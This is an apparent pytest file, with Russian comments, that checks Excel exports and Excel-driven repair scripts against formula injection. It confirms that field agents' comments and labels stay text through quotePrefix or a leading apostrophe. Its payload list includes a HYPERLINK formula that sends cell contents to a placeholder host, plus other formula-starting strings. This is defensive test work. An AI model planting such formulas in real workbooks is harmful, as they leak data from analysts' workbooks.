"""Текст выездника не становится формулой в книгах пульта (ревью 25.09.2026, #6).

Комментарий выезда, «советы» и подпись метки пишет участник с самыми низкими
правами, а открывает аналитик: «=HYPERLINK(…)» в «Реестре целиком» исполнялся
бы при открытии книги со всем реестром. Правило одно, способов записи два:

* openpyxl («Реестр целиком», «Метки») — строка ложится текстом, без
  апострофа внутри: тип ячейки «s» и флаг quotePrefix, как у набранного в
  Excel апострофа; XML-нормализация CR → LF при чтении не является формулой;
* через сам Excel (починка комментариев, обогащение) — ведущий апостроф,
  который Excel съедает при вводе, поэтому повторный прогон читает ровно
  серверный текст и ничего не переписывает.

Числа и даты не трогаются. Excel здесь не запускается.
"""

from __future__ import annotations

import re
import sys
import zipfile
from datetime import date, datetime
from pathlib import Path

from openpyxl import load_workbook

ROOT = Path(__file__).resolve().parents[1]
if str(ROOT) not in sys.path:
    sys.path.append(str(ROOT))

from pult.core.export import write_markers_xlsx, write_registry_xlsx  # noqa: E402

import enrich            # noqa: E402  — pult/ в путь кладёт сам пакет pult.core
import repair_comments   # noqa: E402

# Всё, с чего Excel начинает формулу (или что срезают перед ней при вставке).
DANGEROUS = [
    "=2+2",
    '=HYPERLINK("https://example.invalid/x?d="&B4&C4,"карточка")',
    "+1+1",
    "-1+1",
    "@SUM(1,1)",
    "\t=1+1",
    "\r=1+1",
]
PLAIN = ["видел клиента лично", "5.08 обещал оплатить"]

FIELDS = [
    {"key": "contract_id", "title": "Номер КД / ID", "block": "Инфо", "source": "сх"},
    {"key": "visit_date", "title": "Дата выезда", "block": "Выезд", "source": "хард",
     "date": True},
    {"key": "promise_sum", "title": "Сумма обещания", "block": "Выезд", "source": "хард",
     "num": True},
    {"key": "visit_comment", "title": "Комментарий текущего месяца выезда",
     "block": "Выезд", "source": "хард"},
    {"key": "tips", "title": "Советы", "block": "Выезд", "source": "хард"},
]


def _formulas(path: Path) -> list[str]:
    with zipfile.ZipFile(path) as book:
        xml = book.read("xl/worksheets/sheet1.xml").decode("utf-8")
    return re.findall(r"<f[\s>]", xml)


def test_registry_export_keeps_visit_text_as_text(tmp_path):
    # «#N/A» openpyxl сам делал ошибкой — теперь и это просто текст
    texts = DANGEROUS + PLAIN + ["#N/A"]
    rows = [{"contract_id": f"K-{i}", "visit_date": "2026-09-25",
             "promise_sum": "150000", "visit_comment": text, "tips": "=1+1"}
            for i, text in enumerate(texts)]
    path = tmp_path / "Реестр целиком.xlsx"
    write_registry_xlsx(str(path), FIELDS, rows)

    assert _formulas(path) == [], "строка выездника стала формулой"
    ws = load_workbook(path).active
    for r, text in enumerate(texts, start=4):
        cell = ws.cell(row=r, column=4)
        # XML readers may preserve an escaped CR or normalize a literal CR to
        # LF. Compare that transport difference on both sides; still require
        # exact remaining text, text type, quoting and absence of formulas.
        assert cell.data_type == "s" and cell.value.replace("\r", "\n") == text.replace("\r", "\n"), (r, cell.value)
        assert cell.quotePrefix is (text in DANGEROUS)
        tips = ws.cell(row=r, column=5)
        assert tips.data_type == "s" and tips.value == "=1+1"
        # даты и суммы по-прежнему настоящие даты и числа
        assert ws.cell(row=r, column=2).value == datetime(2026, 9, 25)
        amount = ws.cell(row=r, column=3)
        assert amount.data_type == "n" and amount.value == 150000
    assert ws.cell(row=2, column=4).value == "Комментарий текущего месяца выезда"


def test_markers_export_keeps_label_as_text(tmp_path):
    rows = [{"created_at": "2026-09-25T10:15:00", "kind": "point",
             "telegram_id": 573001, "rep": "K-1", "client": "Синтетик Тест",
             "address": "-ул. Тестовая, 1", "label": text, "lat": 41.3, "lon": 69.2}
            for text in DANGEROUS]
    path = tmp_path / "Метки.xlsx"
    write_markers_xlsx(str(path), rows)

    assert _formulas(path) == [], "подпись метки стала формулой"
    ws = load_workbook(path).active
    for r, text in enumerate(DANGEROUS, start=2):
        label = ws.cell(row=r, column=7)
        assert label.data_type == "s" and label.value.replace("\r", "\n") == text.replace("\r", "\n")
        assert label.quotePrefix is True
        assert ws.cell(row=r, column=6).value == "-ул. Тестовая, 1"
        assert ws.cell(row=r, column=1).value == datetime(2026, 9, 25, 10, 15)
        assert ws.cell(row=r, column=3).value == 573001
        assert ws.cell(row=r, column=8).value == 41.3
        assert ws.cell(row=r, column=9).value == 69.2


def test_excel_input_gets_apostrophe_only_where_needed():
    """Запись через Excel (xlwings/COM): апостроф — отметка «это текст»."""
    for text in DANGEROUS:
        assert enrich.excel_formula_like(text)
        assert enrich._excel_safe(text) == "'" + text
    for text in PLAIN + [""]:
        assert not enrich.excel_formula_like(text)
        assert enrich._excel_safe(text) == text
    day = date(2026, 9, 25)
    assert enrich._excel_safe(day) is day
    assert enrich._excel_safe(150000) == 150000
    assert enrich._excel_safe(41.3) == 41.3
    assert enrich._excel_safe(None) is None
    assert not enrich.excel_formula_like(-5)


def test_repair_comments_writes_text_through_excel_without_rewriting_it():
    """Починка комментариев пишет в живые книги через Excel. Формула из
    комментария выездника туда не попадает, а повторный прогон — где Excel уже
    съел апостроф и читает строку без него — ничего не переписывает."""
    fields = [
        {"key": "contract_id", "title": "Номер КД / ID"},
        {"key": "call_comment", "title": "комментарий звонка"},
        {"key": "visit_comment", "title": "Комментарий текущего месяца выезда"},
    ]
    header = [f["title"] for f in fields]
    comment = DANGEROUS[1]
    srv = {"R-1": {"visit_comment": comment}}
    grid = [header, ["сх", "хард", "хард"], ["R-1", comment, ""]]

    plan = repair_comments.build_repair_plan(grid, fields, srv, {"R-1": "=звонок"})
    assert repair_comments.com_writes(plan["writes"]) == [
        (3, 3, "'" + comment),          # «Комментарий выезда» ← текст выездника
        (3, 2, "'=звонок"),             # «звонок» ← оригинал из копии
    ]
    assert repair_comments.com_writes([(4, 1, None), (5, 2, "обычный текст")]) == [
        (5, 2, None), (6, 3, "обычный текст")]

    # так книга читается после записи: Range.Value — без апострофа
    grid[2] = ["R-1", "=звонок", comment]
    again = repair_comments.build_repair_plan(grid, fields, srv, {"R-1": "=звонок"})
    assert again["writes"] == []
